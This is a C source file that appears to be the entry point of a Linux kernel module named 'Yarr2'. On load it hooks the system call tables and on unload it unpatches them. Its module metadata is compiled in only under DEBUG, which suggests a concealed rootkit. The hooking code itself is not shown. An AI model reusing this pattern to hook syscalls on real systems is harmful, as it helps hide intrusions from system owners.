#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "log.h"
#include "hook.h"
#include "patch.h"

#ifdef DEBUG
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ole");
MODULE_DESCRIPTION("Yarr2 module");
MODULE_VERSION("0.01");
#endif

// TODO: Document all the functions using Doxygen format.

static int __init yarr2_init(void) {
    int err;

    // Hook the system call table.
    yarr_log("Calling hook_syscall_tables()");
    err = hook_syscall_tables();
    if (err) {
        yarr_log("error calling hook_sys_call_tables()\n");
    }

    yarr_log("Returned from hook_syscall_tables()");

    return 0;
}

static void __exit yarr2_exit(void) {
    int err;

    yarr_log("Starting unload of yarr");
    // TODO: I don't fully like this approach (coupling between subsystems).
    // main.c doesn't call patch(), so it shouldn't be calling unpatch_all().
    // Each subsystem unpatching what they did is the correct way. However
    // calling a single time unpatch_all() reduces code complexity.
    err = unpatch_all();
    if (err) {
        yarr_log("error unhooking the syscall tables");
    }

    yarr_log("Finished unloading stuff");
}

module_init(yarr2_init);
module_exit(yarr2_exit);

